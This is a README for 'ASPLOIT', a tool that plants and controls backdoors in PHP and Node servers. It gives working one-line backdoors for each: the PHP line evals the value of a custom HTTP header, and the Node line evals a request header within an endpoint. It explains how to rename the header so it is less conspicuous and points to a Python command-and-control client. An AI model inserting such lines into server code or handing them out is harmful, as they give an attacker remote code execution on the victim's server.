# ASPLOIT
This tool allows you to deploy and exploit backdoors with one line of code in Node and PHP servers.

# Backdoor
## PHP
Add the following line of PHP to the top of the endpoint you want to have the backdoor
```
isset($_SERVER["HTTP_EXPLOIT"]) and eval($_SERVER["HTTP_EXPLOIT"]);
```
## Node
Add the following line to the endpoint you want to have the backdoor
```
if (req.headers?.exploit) return (eval('let r=res;let i=req;'+req.headers?.exploit));
```
Replace `res` with the `ServerResponse` parameter name, and replace `req` with the `IncomingRequest` parameter name.
## Notes
Any area where `EXPLOIT` or `exploit` is referenced can be replaced with any custom HTTP header (eg. for PHP, `HTTP_EXPLOIT` -> `HTTP_ANYTHINGYOUWANT`).

# Client
## Command and Controller
The C2 runs on Python. To start, run `main.py` in the `src` folder.

# Creating Custom Backdoors/Exploits
Coming soon.

# Thank You
This repository was inspired by [PHPSPLOIT](https://github.com/nil0x42/phpsploit).